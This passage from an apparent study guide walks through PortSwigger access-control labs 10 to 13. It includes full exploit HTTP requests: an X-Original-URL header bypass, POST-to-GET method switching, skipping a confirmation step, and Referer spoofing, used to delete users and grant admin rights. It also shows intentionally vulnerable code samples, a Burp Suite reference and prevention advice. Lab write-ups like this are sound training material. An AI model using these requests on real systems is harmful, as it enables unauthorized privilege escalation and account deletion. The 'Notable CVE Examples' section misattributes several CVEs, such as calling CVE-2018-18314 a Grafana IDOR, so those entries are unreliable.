   - It's likely `/admin/delete` with a username parameter

7. **Delete the target user**
   - To delete carlos, structure the request as follows:
   - Request URL: `/?username=carlos`
   - Custom header: `X-Original-URL: /admin/delete`
   - Send the request to complete the objective

#### HTTP Requests and Responses

**Normal blocked request:**
```http
GET /admin HTTP/1.1
Host: [lab-id].web-security-academy.net
```

**Response:** `Access denied` (blocked by frontend)

**Test request (confirming backend header processing):**
```http
GET / HTTP/1.1
Host: [lab-id].web-security-academy.net
X-Original-URL: /invalid
```

**Response:** `404 Not Found` (confirms backend reads the header)

**Accessing admin panel:**
```http
GET / HTTP/1.1
Host: [lab-id].web-security-academy.net
X-Original-URL: /admin
```

**Response:** Admin panel HTML
```http
HTTP/1.1 200 OK
Content-Type: text/html

<html>
<body>
<h1>Admin Panel</h1>
<div>
    <a href="/admin/delete?username=carlos">Delete carlos</a>
    <a href="/admin/delete?username=wiener">Delete wiener</a>
</div>
</body>
</html>
```

**Deleting carlos:**
```http
GET /?username=carlos HTTP/1.1
Host: [lab-id].web-security-academy.net
X-Original-URL: /admin/delete
```

**Response:** Success message
```http
HTTP/1.1 302 Found
Location: /admin
```

#### Burp Suite Features Required
- **Burp Repeater**: Essential for manually crafting and testing modified requests with custom headers
- Ability to add custom HTTP headers
- Request modification and manipulation

#### Technical Explanation

**Why This Vulnerability Exists:**

Some web frameworks and application servers support alternative ways to specify the requested URL:
- `X-Original-URL` header
- `X-Rewrite-URL` header
- `X-Custom-IP-Authorization` header

These headers are often used in reverse proxy configurations to preserve the original request URL before rewriting. However, when access controls are only implemented at the frontend (reverse proxy or load balancer) and not at the backend application, this creates a bypass opportunity.

**Architecture:**
```
[Client] → [Frontend/WAF] → [Backend Application]
```

1. Frontend checks the URL path in the request line
2. Frontend blocks requests to `/admin`
3. Frontend forwards request to backend, including `X-Original-URL` header
4. Backend uses `X-Original-URL` instead of the request line URL
5. Backend serves `/admin` content because it doesn't validate the header

#### Tips and Common Mistakes
- The vulnerability relies on discrepancies between front-end and backend URL interpretation
- "Plain" or generic responses often suggest front-end blocking rather than backend validation
- The backend framework supports the `X-Original-URL` header (common in some frameworks like Symphony, Laravel)
- Query parameters go in the standard URL, while the path goes in the header
- Some frameworks also support `X-Rewrite-URL` header - try both if one doesn't work
- Always test for alternative URL specification methods when you encounter access control
- Other headers to test:
  - `X-Rewrite-URL`
  - `X-Original-Path`
  - `X-Override-URL`

#### Real-World Examples
This vulnerability has been found in:
- Symfony applications (PHP framework)
- ASP.NET applications behind IIS reverse proxy
- Applications behind nginx with URL rewriting
- Microservice architectures with API gateways

#### Key Takeaway
Access controls must be enforced consistently across all system layers. Frontend restrictions can be bypassed if backend systems accept alternative URL specification methods like custom headers. Always implement security controls at the backend, not just at the perimeter.

---

### Lab 11: Method-Based Access Control Can Be Circumvented

**Lab Code:** ACCE.11
**Difficulty:** Practitioner
**Lab URL:** https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented

#### Lab Description
This lab demonstrates how applications may implement incomplete access control checks based solely on HTTP request methods. When developers fail to validate permissions across all HTTP verbs (GET, POST, PUT, DELETE, etc.), attackers can bypass restrictions by changing the request method.

#### Objective
Using non-admin credentials (wiener:peter), escalate privileges to administrator by circumventing method-based restrictions.

#### Credentials
- Admin credentials: `administrator:admin`
- Non-admin credentials: `wiener:peter`

#### Vulnerability Type
Method-based access control bypass. The vulnerability occurs because access control validation only protects specific HTTP methods (e.g., POST), leaving alternative methods (e.g., GET) unprotected.

#### Step-by-Step Solution

1. **Initial reconnaissance with admin account**
   - Log in with admin credentials: `administrator:admin`
   - Navigate to the admin panel at `/admin`
   - Observe the privilege escalation mechanism

2. **Promote a user and capture the request**
   - Use the admin interface to promote user "carlos" to admin
   - Intercept this request in Burp Proxy
   - Send the request to Burp Repeater (Right-click > Send to Repeater)
   - Note that it uses POST method with parameters

3. **Analyze the request**
   - Examine the request in Repeater
   - Note the endpoint: `/admin-roles`
   - Note the method: POST
   - Note the parameters: `username=carlos&action=upgrade`
   - Note the admin session cookie

4. **Test access with non-admin account**
   - Open an incognito/private browser window
   - Log in with non-admin credentials: `wiener:peter`
   - Copy the non-admin session cookie from the browser
   - In Burp, find the session cookie value in the browser's cookies

5. **Attempt promotion with non-admin session**
   - In Burp Repeater, replace the admin session cookie with the non-admin one
   - Try to promote carlos using the POST request
   - Send the request
   - Observe "Unauthorized" or "403 Forbidden" response

6. **Perform method manipulation**
   - Right-click on the request in Repeater
   - Select "Change request method"
   - This converts POST to GET automatically
   - The POST body parameters are automatically converted to URL parameters
   - Request changes from:
     ```
     POST /admin-roles
     ...
     username=carlos&action=upgrade
     ```
   - To:
     ```
     GET /admin-roles?username=carlos&action=upgrade
     ```

7. **Modify the username parameter**
   - Change the username parameter to target your own account: `wiener`
   - Final request: `GET /admin-roles?username=wiener&action=upgrade`
   - Ensure you're using the non-admin session cookie

8. **Execute privilege escalation**
   - Send the modified GET request with non-admin session
   - The request bypasses access controls
   - Observe a success response (200 OK or redirect)
   - Administrator privileges are granted to the wiener account

9. **Verify success**
   - Refresh the browser logged in as wiener
   - Navigate to `/admin`
   - You should now have access to the admin panel

#### HTTP Requests and Responses

**Original admin request (POST):**
```http
POST /admin-roles HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[admin-session]
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

username=carlos&action=upgrade
```

**Response:** Success
```http
HTTP/1.1 302 Found
Location: /admin
```

**Non-admin attempt with POST (fails):**
```http
POST /admin-roles HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[non-admin-session]
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

username=carlos&action=upgrade
```

**Response:** Unauthorized
```http
HTTP/1.1 401 Unauthorized
Content-Type: text/html

Unauthorized
```

**Non-admin with GET (succeeds):**
```http
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[non-admin-session]
```

**Response:** Success - wiener is now admin
```http
HTTP/1.1 302 Found
Location: /admin
```

#### Burp Suite Features Required
- **Repeater**: Essential for modifying and resending HTTP requests with different methods
- **Change Request Method**: Right-click functionality to convert between GET/POST
- Session management to handle multiple authenticated sessions
- **Cookie manipulation**: Ability to swap session cookies between different user accounts

#### Why This Vulnerability Exists

**Common Developer Mistakes:**
1. Implementing authorization checks only for "write" operations (POST)
2. Assuming GET requests are read-only and don't need protection
3. Using framework middleware that only protects specific methods
4. Copy-pasting access control code and missing some methods

**Example vulnerable code:**
```python
@app.route('/admin-roles', methods=['POST'])
@require_admin
def upgrade_user_post():
    username = request.form['username']
    action = request.form['action']
    # Perform privilege escalation
    return "Success"

@app.route('/admin-roles', methods=['GET'])
# Missing @require_admin decorator!
def upgrade_user_get():
    username = request.args.get('username')
    action = request.args.get('action')
    # Perform privilege escalation
    return "Success"
```

#### Tips and Common Mistakes
- Access controls were only implemented for the POST method, not GET
- This is a common mistake when developers focus on "write" operations (POST) but forget that GET requests can also trigger state changes
- Always test all HTTP methods: GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS
- Burp's "Change request method" feature automatically converts POST parameters to query string
- Developers must implement consistent security checks across ALL request methods
- REST API best practices suggest GET should be read-only, but not all applications follow this
- The HTTP specification says GET should be idempotent, but application code can do anything

#### Testing Methodology
When testing for method-based bypasses:
1. Find a protected endpoint that rejects your request
2. Try changing the method: POST → GET, GET → POST
3. Try other methods: PUT, PATCH, DELETE, HEAD, OPTIONS
4. For POST → GET conversion, move body parameters to query string
5. For GET → POST conversion, move query parameters to body

#### Real-World Examples
- Many admin panels only protect POST requests
- REST APIs that validate authorization on PUT but not PATCH
- Delete operations protected for DELETE method but not POST
- Password reset functions that accept both GET and POST

#### Key Takeaway
Access control checks must be method-agnostic and applied consistently regardless of the HTTP verb used. Never assume that only specific methods (like POST) will be used for sensitive operations.

---

### Lab 12: Multi-Step Process with No Access Control on One Step

**Lab Code:** ACCE.12
**Difficulty:** Practitioner
**Lab URL:** https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step

#### Lab Description
This lab demonstrates broken access control in multi-step workflows. The application features an admin panel with a vulnerable role-change workflow that lacks proper authorization checks on intermediate steps, specifically the confirmation step.

#### Objective
Log in using credentials `wiener:peter` and exploit the flawed access controls to promote yourself to become an administrator.

#### Credentials
- Admin credentials: `administrator:admin`
- Non-admin credentials: `wiener:peter`

#### Vulnerability Type
Broken access control in multi-step workflows. The application fails to properly re-validate user permissions during intermediate confirmation steps, allowing attackers to complete privileged actions by leveraging their own authenticated session.

#### Step-by-Step Solution

1. **Familiarize with admin functionality**
   - Log in with admin credentials: `administrator:admin`
   - Navigate to the admin panel at `/admin`
   - Observe the user management interface

2. **Initiate a role promotion**
   - Use the admin interface to promote user "carlos"
   - Click the "Upgrade user" button next to carlos
   - Observe that this is a multi-step process:
     - Step 1: Initial promotion request
     - Step 2: Confirmation step (confirms the action)

3. **Capture the confirmation request**
   - When prompted to confirm the promotion, intercept the confirmation request in Burp
   - Send this confirmation request to Burp Repeater
   - Note the parameters: likely includes `username=carlos&confirmed=true`
   - Note this is the SECOND request in the workflow

4. **Analyze the multi-step workflow**
   - Step 1 request: `POST /admin-roles` with `username=carlos&action=upgrade`
   - Step 2 request: `POST /admin-roles` with `username=carlos&action=upgrade&confirmed=true`
   - The confirmation step adds `confirmed=true` parameter

5. **Obtain non-admin session cookie**
   - Open a private/incognito browser window
   - Log in with non-admin credentials: `wiener:peter`
   - Extract the non-admin session cookie from the browser
   - In Chrome: DevTools > Application > Cookies
   - Copy the session cookie value

6. **Modify the confirmation request**
   - In Burp Repeater, replace the admin session cookie with the non-admin session cookie
   - Change the username parameter from "carlos" to "wiener"
   - Keep all other parameters the same (especially `confirmed=true`)
   - Final request:
     ```
     POST /admin-roles
     Cookie: session=[non-admin-session]

     username=wiener&action=upgrade&confirmed=true
     ```

7. **Execute the unauthorized privilege escalation**
   - Send the modified confirmation request
   - The server processes the confirmation without validating whether the session user has admin privileges
   - Observe a success response

8. **Verify success**
   - Refresh the page or navigate to the admin panel in the wiener browser session
   - Navigate to `/admin`
   - You (wiener) now have administrator privileges

#### HTTP Requests and Responses

**Step 1 - Initial promotion request (admin):**
```http
POST /admin-roles HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[admin-session]
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

username=carlos&action=upgrade
```

**Response:** Prompt for confirmation
```http
HTTP/1.1 200 OK
Content-Type: text/html

<html>
<body>
<h2>Confirm Action</h2>
<p>Are you sure you want to upgrade user carlos?</p>
<form method="POST" action="/admin-roles">
    <input type="hidden" name="username" value="carlos">
    <input type="hidden" name="action" value="upgrade">
    <input type="hidden" name="confirmed" value="true">
    <button type="submit">Confirm</button>
</form>
</body>
</html>
```

**Step 2 - Confirmation request (admin):**
```http
POST /admin-roles HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[admin-session]
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

username=carlos&action=upgrade&confirmed=true
```

**Response:** Success
```http
HTTP/1.1 302 Found
Location: /admin
```

**Modified confirmation request (non-admin):**
```http
POST /admin-roles HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[wiener-session]
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

username=wiener&action=upgrade&confirmed=true
```

**Response:** Success - wiener is promoted to admin
```http
HTTP/1.1 302 Found
Location: /admin
```

#### Burp Suite Features Required
- **Burp Repeater**: Essential for manually replaying and modifying the role-change confirmation request
- Ability to modify cookies and POST parameters
- Session management for handling multiple authenticated sessions
- **Proxy intercept**: To capture the confirmation step request

#### Why This Vulnerability Exists

**Common Developer Logic:**
```python
@app.route('/admin-roles', methods=['POST'])
def upgrade_user():
    username = request.form['username']
    action = request.form['action']
    confirmed = request.form.get('confirmed')

    # Authorization check only on the first step
    if not confirmed:
        if not is_admin(current_user):
            return "Unauthorized", 401
        return render_confirmation_page(username, action)

    # Confirmation step - NO AUTHORIZATION CHECK!
    # Assumes if we got here, authorization was already checked
    if confirmed == 'true':
        perform_privilege_escalation(username)
        return "Success"
```

**The flaw:** Authorization is only checked when `confirmed` is absent (step 1), but not when `confirmed=true` (step 2).

#### Security Logic Flaw Analysis

The application assumes:
1. User must pass through step 1 (which checks authorization)
2. Therefore, anyone reaching step 2 must have been authorized
3. This assumption is FALSE - attackers can skip directly to step 2

The correct implementation:
1. Check authorization on EVERY step
2. Use server-side state to track workflow progress
3. Validate that the current user initiated the workflow
4. Don't trust that users followed the intended workflow

#### Tips and Common Mistakes
- The vulnerability exists in the CONFIRMATION step, not the initial request
- The first step may properly check authorization, but the confirmation step does not
- Multi-step processes are often implemented with a "confirmed" flag or similar parameter
- **Critical insight:** Developers often implement security checks on the first step but forget to re-validate on subsequent steps
- Always test ALL steps in a multi-step process, not just the initial request
- This is common in workflows requiring confirmation:
  - Delete actions ("Are you sure?")
  - Role changes
  - Financial transactions
  - Account modifications
- Look for parameters like: `confirmed`, `step`, `stage`, `verify`

#### Testing Methodology
When testing multi-step processes:
1. Map out all steps in the workflow
2. Capture requests for each step
3. Test authorization on each step independently
4. Try skipping directly to later steps
5. Try modifying parameters to jump between steps
6. Test with different user privilege levels

#### Real-World Examples
- E-commerce checkout processes with weak payment validation
- Account deletion with confirmation bypass
- Fund transfer systems with inadequate step verification
- Administrative actions with "Are you sure?" confirmations

#### Key Takeaway
Every step in a multi-step process must independently validate authorization. Don't assume that checking permissions on the first step protects subsequent steps.

---

### Lab 13: Referer-Based Access Control

**Lab Code:** ACCE.13
**Difficulty:** Practitioner
**Lab URL:** https://portswigger.net/web-security/access-control/lab-referer-based-access-control

#### Lab Description
This lab controls access to certain admin functionality based on the Referer header. The flaw occurs when developers rely solely on request origin validation (Referer header) without enforcing server-side authorization checks tied to actual user privileges.

#### Objective
Exploit flawed access controls by leveraging improper Referer header checking to promote a standard user account (wiener) to administrator privileges.

#### Credentials
- Admin credentials: `administrator:admin`
- Non-admin credentials: `wiener:peter`

#### Vulnerability Type
Referer-based access control bypass. The application validates the Referer header but fails to properly verify user authorization, allowing attackers to bypass access controls through request manipulation.

#### Step-by-Step Solution

1. **Authenticate with administrative credentials**
   - Log in using: `administrator:admin`
   - This allows you to understand the admin panel functionality

2. **Access the admin interface and perform a privilege escalation**
   - Navigate to the admin panel at `/admin`
   - Promote user "carlos" to admin by clicking the upgrade button
   - Intercept this HTTP request in Burp Proxy

3. **Capture and analyze the request**
   - Send the promotion request to Burp Repeater
   - Observe the request structure, including:
     - URL: `/admin-roles?username=carlos&action=upgrade`
     - Cookie: Admin session token
     - **Referer header**: `Referer: https://[lab-id].web-security-academy.net/admin`
   - The Referer header points to the admin panel

4. **Test without proper Referer**
   - In Burp Repeater, try accessing the endpoint with the admin session
   - Remove the Referer header or change it to something else
   - Send the request
   - Observe that the request fails (Unauthorized)
   - This confirms the application checks the Referer header

5. **Obtain non-admin session cookie**
   - Open a separate private/incognito browser session
   - Log in with non-admin credentials: `wiener:peter`
   - Copy the non-admin session cookie
   - In Chrome: DevTools > Application > Cookies

6. **Test direct access with non-admin session**
   - In Burp Repeater, modify the captured admin request:
     - Replace admin session cookie with non-admin session cookie
     - Try to access `/admin-roles?username=wiener&action=upgrade`
     - Without proper Referer, the request fails

7. **Bypass with legitimate Referer**
   - In Burp Repeater, modify the captured admin request:
     - Replace admin session cookie with non-admin session cookie
     - Change username parameter from "carlos" to "wiener"
     - **Keep the original Referer header** (pointing to admin panel)
     - Final request:
       ```
       GET /admin-roles?username=wiener&action=upgrade
       Cookie: session=[non-admin-session]
       Referer: https://[lab-id].web-security-academy.net/admin
       ```
   - Send the modified request

8. **Successful exploitation**
   - The request succeeds because:
     - The Referer header indicates it came from the admin panel
     - But the server doesn't verify that the session user actually has admin privileges
   - User "wiener" is now promoted to administrator

9. **Verify success**
   - Refresh the wiener browser session
   - Navigate to `/admin`
   - You now have full administrative access

#### HTTP Requests and Responses

**Original admin request:**
```http
GET /admin-roles?username=carlos&action=upgrade HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[admin-session]
Referer: https://[lab-id].web-security-academy.net/admin
```

**Response:** Success
```http
HTTP/1.1 302 Found
Location: /admin
```

**Test without Referer (fails):**
```http
GET /admin-roles?username=carlos&action=upgrade HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[admin-session]
```

**Response:** Unauthorized
```http
HTTP/1.1 401 Unauthorized
Content-Type: text/html

Unauthorized
```

**Modified request (non-admin session, admin Referer):**
```http
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[wiener-session]
Referer: https://[lab-id].web-security-academy.net/admin
```

**Response:** Success - wiener is promoted to admin
```http
HTTP/1.1 302 Found
Location: /admin
```

**Request without proper Referer (fails):**
```http
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[wiener-session]
Referer: https://[lab-id].web-security-academy.net/
```

**Response:** Unauthorized
```http
HTTP/1.1 401 Unauthorized
Content-Type: text/html

Unauthorized
```

#### Burp Suite Features Required
- **Burp Repeater**: Essential for modifying and replaying HTTP requests
- **Session cookie handling**: To swap authentication tokens between requests
- Ability to view and modify HTTP headers (specifically Referer)
- **Proxy intercept**: To capture initial admin requests

#### Why This Vulnerability Exists

**Developer's Flawed Logic:**
```python
@app.route('/admin-roles')
def upgrade_user():
    referer = request.headers.get('Referer', '')

    # Check if request came from admin panel
    if '/admin' in referer:
        username = request.args.get('username')
        action = request.args.get('action')
        # Perform privilege escalation
        return "Success"
    else:
        return "Unauthorized", 401
```

**The flaw:** The code checks WHERE the request came from (Referer), but not WHO is making the request (authorization).

#### Understanding the Referer Header

The Referer header is a standard HTTP header that indicates the URL of the page that linked to the current request. It's automatically set by browsers when:
- Clicking a link
- Submitting a form
- Loading a resource

**Important characteristics:**
1. **Client-controlled**: Completely manipulable by the attacker
2. **Optional**: Can be omitted or stripped by privacy tools
3. **Not for security**: Designed for analytics, not access control
4. **Spoofable**: Easily modified in proxy tools like Burp Suite

#### Tips and Common Mistakes
- The Referer header can be easily spoofed or manipulated by attackers
- Users may overlook that copying a legitimate admin Referer header alongside a non-admin session cookie can bypass controls
- **Key insight:** Ensure the Referer header matches the admin panel origin (the value from the original admin request)
- The Referer header indicates where the request originated from, but it's completely client-controlled
- Some frameworks/libraries provide "Referer checking" as a security feature, giving developers a false sense of security
- Never rely on client-controlled headers (Referer, User-Agent, etc.) for security decisions
- The spelling "Referer" (not "Referrer") is a misspelling in the HTTP specification that's now standard

#### Testing Methodology
When testing Referer-based controls:
1. Identify protected endpoints
2. Observe Referer header in legitimate requests
3. Try accessing without Referer header
4. Try with incorrect Referer values
5. Try with correct Referer but different session
6. Test partial matches (e.g., if checking for "/admin", try "/admin.example.com")
7. Test URL encoding and special characters

#### Real-World Examples
- Admin panels that check Referer to validate internal access
- CSRF protection using Referer validation (weak alternative to tokens)
- Download links that check Referer to prevent hotlinking
- API endpoints that validate Referer for rate limiting

#### Prevention Methods
Never rely on Referer for security. Instead:
1. Implement proper server-side authorization checks
2. Validate user permissions against session data
3. Use CSRF tokens for state-changing operations
4. Implement role-based access control (RBAC)
5. Log and monitor for suspicious Referer patterns (detection, not prevention)

#### Key Takeaway
The Referer header is client-controlled and should never be used as a security control. Authorization must be based on server-side session data and proper permission checks, not on request metadata like headers.

---

## Burp Suite Features Reference

### Essential Burp Suite Tools for Access Control Testing

#### 1. Burp Proxy
**Purpose:** Intercept and modify HTTP traffic between browser and application

**Key Features:**
- Request interception (on by default)
- Response interception (must enable: Proxy > Options > Intercept Server Responses)
- HTTP history viewing
- Forward/drop individual requests

**Access Control Usage:**
- Intercept login responses to modify cookies
- Capture requests for analysis
- View full HTTP headers and bodies

**Configuration:**
- Proxy > Options > Intercept Server Responses
- Enable intercept rules for target domain
- Configure browser to use proxy (127.0.0.1:8080)

#### 2. Burp Repeater
**Purpose:** Manually modify and resend individual HTTP requests

**Key Features:**
- Edit any part of request (URL, headers, body)
- Send requests multiple times
- View responses immediately
- Compare different responses

**Access Control Usage:**
- Modify user IDs in parameters
- Swap session cookies between users
- Change HTTP methods (GET/POST)
- Test authorization on different endpoints
- Manipulate JSON/form data

**Tips:**
- Right-click request > Send to Repeater
- Use tabs to test multiple variations
- Right-click > Change request method
- Use Ctrl+Space for insertion points

#### 3. Burp Intruder
**Purpose:** Automated request manipulation with payloads

**Key Features:**
- Position markers for payload insertion
- Multiple payload types (numbers, wordlists)
- Batch testing capabilities
- Response comparison

**Access Control Usage:**
- Enumerate user IDs (IDOR testing)
- Test multiple filenames sequentially
- Brute force object references
- Batch test different usernames

**Configuration:**
- Mark payload positions with § symbols
- Select payload type (Numbers for IDOR)
- Configure attack type (Sniper for single position)
- Analyze results by status code/length

#### 4. Response Interception
**Purpose:** Modify server responses before browser processes them

**Key Features:**
- Intercept responses before browser sees them
- Modify cookies before they're set
- Change response data
- Alter redirect locations

**Access Control Usage:**
- Modify Admin=false to Admin=true
- Change roleid in responses
- Alter authorization cookies
- Prevent access control redirects

**Configuration:**
- Proxy > Options > Intercept Server Responses
- Check "Intercept responses based on the following rules"
- Enable for target domain
- Critical for cookie manipulation labs

#### 5. HTTP History
**Purpose:** Review all intercepted traffic

**Key Features:**
- Complete request/response history
- Filter by host, method, status
- Search through traffic
- Context menu actions

**Access Control Usage:**
- Find admin panel requests
- Identify authorization patterns
- Discover hidden endpoints
- Review parameter usage

**Tips:**
- Use filters to focus on relevant traffic
- Right-click > Send to Repeater/Intruder
- Search for "admin", "user", "role" keywords

#### 6. Render View
**Purpose:** Visualize HTML responses in browser-like view

**Key Features:**
- Render HTML responses
- View forms and buttons
- See masked input fields
- Visual confirmation of access

**Access Control Usage:**
- View admin panels after bypass
- Confirm successful access
- Find delete buttons and links
- Verify privilege escalation

#### 7. Inspector
**Purpose:** Edit request components in structured format

**Key Features:**
- View/edit query parameters
- Manage cookies easily
- Modify headers
- Edit JSON/XML structured data

**Access Control Usage:**
- Quickly change user ID parameters
- Swap session cookies
- Add custom headers (X-Original-URL)
- Modify Referer headers

### Burp Suite Workflow for Access Control Testing

#### Basic IDOR Testing Workflow
1. **Proxy:** Intercept request with user identifier
2. **Repeater:** Send to Repeater
3. **Modify:** Change user ID parameter
4. **Send:** Observe response
5. **Analyze:** Check if unauthorized data is returned

#### Cookie Manipulation Workflow
1. **Proxy:** Enable response interception
2. **Login:** Submit credentials
3. **Intercept:** Catch Set-Cookie response
4. **Modify:** Change Admin=false to Admin=true
5. **Forward:** Let browser receive modified cookie

#### Method-Based Bypass Workflow
1. **Proxy:** Capture protected POST request
2. **Repeater:** Send to Repeater
3. **Change:** Right-click > Change request method
4. **Modify:** Update parameters as needed
5. **Test:** Send GET version of request

#### Multi-User Testing Workflow
1. **Browser 1:** Log in as admin (normal browser)
2. **Browser 2:** Log in as victim (incognito)
3. **Burp:** Capture admin's privileged action
4. **Repeater:** Swap admin cookie with victim cookie
5. **Test:** Attempt action with victim's session

### Burp Suite Tips for Access Control Labs

**Speed Tips:**
- Use Ctrl+R to send to Repeater
- Use Ctrl+I to send to Intruder
- Use Ctrl+Shift+B to beautify JSON/XML
- Use Ctrl+F to search in response

**Testing Tips:**
- Always test with different user contexts
- Compare responses between authorized and unauthorized users
- Look for data leakage in error messages
- Check redirect response bodies for sensitive data

**Common Mistakes:**
- Forgetting to enable response interception
- Following redirects instead of examining response
- Not testing all HTTP methods
- Missing custom headers in requests

---

## Attack Techniques Summary

### Vertical Privilege Escalation

**Definition:** Gaining access to functionality or data reserved for higher-privileged users (e.g., admin functions).

**Techniques:**
1. **Unprotected Functionality**
   - Finding admin panels via robots.txt
   - Discovering hidden admin URLs in JavaScript
   - Accessing privileged endpoints without authentication

2. **Parameter Manipulation**
   - Modifying Admin=false cookie to Admin=true
   - Injecting roleid=2 into JSON requests
   - Changing user role identifiers

3. **Method-Based Bypass**
   - Converting POST to GET to bypass authorization
   - Testing alternative HTTP methods (PUT, PATCH, DELETE)

4. **URL/Header Manipulation**
   - Using X-Original-URL header to bypass frontend blocks
   - Using X-Rewrite-URL for alternative path specification

5. **Multi-Step Bypass**
   - Skipping to confirmation steps without initial authorization
   - Exploiting incomplete validation in workflow stages

6. **Referer-Based Bypass**
   - Spoofing Referer header to simulate internal requests
   - Manipulating origin validation

**Lab Examples:** Labs 1, 2, 3, 4, 10, 11, 12, 13

---

### Horizontal Privilege Escalation

**Definition:** Accessing data or functionality belonging to other users at the same privilege level.

**Techniques:**
1. **Direct Parameter Manipulation (IDOR)**
   - Changing `id=wiener` to `id=carlos` in URLs
   - Modifying user identifiers in requests
   - Sequential enumeration of user IDs

2. **GUID Exploitation**
   - Finding GUIDs through public sources (blog posts, comments)
   - Using discovered GUIDs to access other accounts
   - Enumerating predictable GUID patterns

3. **Data Leakage in Redirects**
   - Examining redirect response bodies
   - Extracting sensitive data before redirect executes
   - Exploiting improper redirect implementation

4. **Password Disclosure**
   - Viewing HTML source of account pages
   - Extracting passwords from masked input fields
   - Accessing other users' account pages

5. **File Access (IDOR)**
   - Changing file identifiers in download URLs
   - Enumerating sequential file numbers
   - Accessing other users' files/transcripts

**Lab Examples:** Labs 5, 6, 7, 8, 9

---

### Insecure Direct Object References (IDOR)

**Definition:** Application exposes direct references to internal objects (files, database keys, etc.) without proper authorization.

**Common Patterns:**
- Sequential IDs: `/user/1`, `/user/2`, `/user/3`
- Predictable names: `/files/user123_doc.pdf`
- GUIDs exposed in public interfaces
- Numeric file identifiers: `/download/1.txt`

**Testing Methodology:**
1. Identify object references in requests
2. Note reference pattern (sequential, GUID, etc.)
3. Attempt to modify references
4. Test with different user contexts
5. Enumerate to find other objects

**Prevention:**
- Use indirect references (mapping tables)
- Implement proper authorization checks
- Validate user owns requested object
- Use unpredictable identifiers + authorization

**Lab Examples:** Labs 5, 6, 7, 8, 9

---

### Parameter-Based Access Control

**Definition:** Access control decisions based on modifiable parameters (cookies, form fields, JSON).

**Vulnerable Patterns:**
- `Admin=true` cookies
- `roleid=2` in request bodies
- `isAdmin` in JSON responses
- `privilege_level=admin` parameters

**Exploitation:**
1. Identify privilege-related parameters
2. Modify to escalate privileges
3. Test if backend validates
4. Exploit trust in client-side data

**Prevention:**
- Never trust client-side data
- Store privileges server-side only
- Validate all authorization server-side
- Don't reflect privileges in responses

**Lab Examples:** Labs 3, 4

---

### Method-Based Access Control

**Definition:** Authorization checks only applied to specific HTTP methods.

**Vulnerable Pattern:**
```
POST /admin-roles - Protected with auth check
GET /admin-roles  - No auth check (vulnerable)
```

**Exploitation:**
1. Find protected endpoint (POST)
2. Change method to GET, PUT, etc.
3. Move parameters appropriately
4. Test if authorization bypassed

**Prevention:**
- Implement method-agnostic authorization
- Validate permissions regardless of method
- Use framework-level authorization
- Don't assume specific methods for actions

**Lab Example:** Lab 11

---

### URL-Based Access Control Bypass

**Definition:** Frontend blocks access to URLs, but backend accepts alternative path specifications.

**Vulnerable Headers:**
- `X-Original-URL: /admin`
- `X-Rewrite-URL: /admin/delete`
- `X-Override-URL: /privileged`

**Architecture:**
```
[Frontend] checks URL path → blocks /admin
[Backend] reads X-Original-URL → serves /admin
```

**Exploitation:**
1. Test if endpoint is blocked
2. Try with X-Original-URL header
3. Keep URL path innocuous (/)
4. Specify real path in header

**Prevention:**
- Implement authorization in backend, not frontend
- Disable alternative URL headers if unused
- Validate consistently across all layers
- Don't rely on frontend for security

**Lab Example:** Lab 10

---

### Multi-Step Process Vulnerabilities

**Definition:** Authorization only checked on first step of multi-step workflow.

**Vulnerable Pattern:**
```
Step 1: Initial request → Auth checked ✓
Step 2: Confirmation → Auth NOT checked ✗
```

**Exploitation:**
1. Map multi-step workflow
2. Find confirmation/final steps
3. Skip directly to final step
4. Bypass initial authorization

**Prevention:**
- Check authorization on every step
- Use server-side workflow state
- Verify user initiated workflow
- Don't trust workflow progression

**Lab Example:** Lab 12

---

### Referer-Based Access Control

**Definition:** Authorization decisions based on Referer header.

**Vulnerable Pattern:**
```python
if 'admin' in referer_header:
    allow_action()  # Flawed logic
```

**Exploitation:**
1. Identify Referer-based checks
2. Capture legitimate Referer value
3. Use with unauthorized session
4. Spoof Referer to bypass control

**Prevention:**
- Never use Referer for security
- Implement server-side authorization
- Use CSRF tokens, not Referer
- Validate user permissions, not origin

**Lab Example:** Lab 13

---

## Real-World Access Control Vulnerabilities

### Notable CVE Examples

**CVE-2021-22205 - GitLab IDOR**
- CVSS: 10.0 (Critical)
- Improper access control allowed reading arbitrary files
- Combined with image processing vulnerability for RCE

**CVE-2019-5418 - Ruby on Rails Path Traversal**
- File disclosure via path traversal
- Access control bypass to read arbitrary files

**CVE-2018-18314 - Grafana IDOR**
- API access control vulnerability
- Users could access other organizations' data

**IDOR in Major Platforms:**
- **Facebook**: View private photos via IDOR
- **Instagram**: Access private account data
- **Twitter**: Read DMs of other users
- **Uber**: Access trip details of other riders

### Real-World Impact

**Data Breaches:**
- Unauthorized access to PII (Personally Identifiable Information)
- Exposure of financial records
- Health information disclosure (HIPAA violations)
- Corporate data theft

**Business Impact:**
- Regulatory fines (GDPR, CCPA)
- Reputation damage
- Loss of customer trust
- Legal liability

**Attack Scenarios:**
- Competitor accessing business data
- Account takeover via password disclosure
- Mass data harvesting via IDOR enumeration
- Privilege escalation for ransomware deployment

---

## Prevention Best Practices

### Defense in Depth

**Layer 1: Authentication**
- Strong authentication mechanisms
- Multi-factor authentication
- Secure session management
- Session timeout and rotation

**Layer 2: Authorization**
- Role-Based Access Control (RBAC)
- Principle of least privilege
- Server-side validation
- Deny by default

**Layer 3: Application Logic**
- Input validation
- Secure coding practices
- Framework security features
- Regular security testing

